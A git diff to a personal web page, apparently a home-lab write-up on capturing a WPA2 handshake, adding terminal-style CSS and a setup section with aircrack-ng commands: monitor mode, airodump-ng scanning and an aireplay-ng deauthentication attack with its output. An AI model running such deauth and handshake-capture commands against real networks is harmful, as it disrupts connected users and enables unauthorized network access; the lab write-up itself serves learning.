@@ -9,7 +9,55 @@
     <link rel="stylesheet" href="/assets/css/style.css">
     
     <style>
-        
+        /* Terminal Container */
+.terminal {
+  background-color: #0c0c0c;
+  color: #00ff00; /* Classic matrix green (change to #ffffff for modern mono) */
+  font-family: 'Courier New', Courier, monospace;
+  padding: 20px;
+  border-radius: 6px;
+  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.5);
+  line-height: 1.5;
+  max-width: 600px;
+}
+
+/* Base paragraph styling for lines */
+.terminal p {
+  margin: 0 0 8px 0;
+  white-space: pre-wrap; /* Preserves spaces and wraps long commands */
+}
+
+/* Prompt character ($) */
+.terminal .prompt {
+  color: #38bdf8; /* Light blue for the user prompt */
+  font-weight: bold;
+}
+
+/* Command inputs */
+.terminal .command {
+  color: #f1f5f9; /* Off-white for typed commands */
+}
+
+/* Standard system outputs */
+.terminal .output {
+  color: #a3a3a3; /* Muted gray for system outputs */
+}
+
+/* Success or positive outputs */
+.terminal .output.success {
+  color: #4ade80; 
+}
+
+/* Blinking cursor effect */
+.terminal .cursor {
+  animation: blink 1s infinite;
+}
+
+@keyframes blink {
+  0%, 49% { opacity: 1; }
+  50%, 100% { opacity: 0; }
+}
+
     </style>
 </head>
 
@@ -68,6 +116,34 @@
                 You basically pretend to be the router and broadcast the victim routers MAC address to the victim device telling it to disconnect.
                 This forces the victim device to reconnect allowing more opportunity to grab the handshake.
             </p>
+        </div>
+        <div>
+            <h2>The Setup</h2>
+            <p>
+                My original setup was thrown together with what scraps I could find. ASUS Router which will act as the target network.
+                I then had the second DLink router that acted as a makeshift webserver. I discovered that windows doesnt support usb passthrough or aircrack-ng,
+                so I had to go download the latest kali iso and dual boot my main system. Once into Kali I got started with aircrack.
+                <br>
+                I didnt know my bssid so I did a quick airmon-ng scan and found all the info i needed.
+
+            </p>
+            <div class="terminal">
+                <p class="command"><span class="prompt">kali@system:~$</span> sudo airmon-ng start wlan1</p>
+                <p class="command"><span class="prompt">kali@system:~$</span> sudo airodump-ng wlan1mon</p>
+                <p class="output">BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</p>
+                <p class="output">34:97:F6:xx:xx:xx  -20        6        0    0   8   65   WPA2 CCMP   PSK  DangerousNetwork</p>
+            </div>
+            <p>
+                With the target wifi bssid and essid I can start trying to capture a handshake. I start the airodump again but I add in specific selectors.
+                Along with starting that, I started a deauth attack on one of the devices connected to the wifi network. After a few minutes I was able to capture a packet.
+            </p>
+            <div class="terminal">
+                <p class="command"><span class="prompt">kali@system:~$</span> sudo aireplay-ng -0 5 -a 34:97:F6:xx:xx:xx -c ta:rg:et:ma:ca:dd wlan1mon</p>
+                <p class="output">20:00:00  Waiting for beacon frame (BSSID: 34:97:F6:xx:xx:xx) on channel 8</p>
+                <p class="output">20:00:01  Sending 64 deauth to station -- STMAC: [ta:rg:et:ma:ca:dd] [ 5 /  5 pckts]</p>
+                <p class="output">...    GAP IN TIME    ...</p>
+                <p class="output">20:05:23  Sending 64 deauth to station -- STMAC: [ta:rg:et:ma:ca:dd] [ 9394 /  9394 pckts]</p>
+            </div>
         </div>
         <p>
             ====================================================
